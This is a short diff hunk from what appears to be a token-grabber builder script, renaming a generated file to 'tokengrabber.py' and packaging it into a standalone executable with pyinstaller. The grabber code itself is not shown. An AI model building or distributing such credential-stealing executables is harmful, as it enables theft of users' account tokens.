@@ -159,7 +159,7 @@ except Exception:
     pass
 '''
 
-open('generatedgrabber.py', 'wb').write(bytes(grabbercode.encode('ascii')))
+open('tokengrabber.py', 'wb').write(bytes(grabbercode.encode('ascii')))
 
-os.system('pyinstaller --onefile -c -F generatedgrabber.py')
+os.system('pyinstaller --onefile -c -F tokengrabber.py')
 
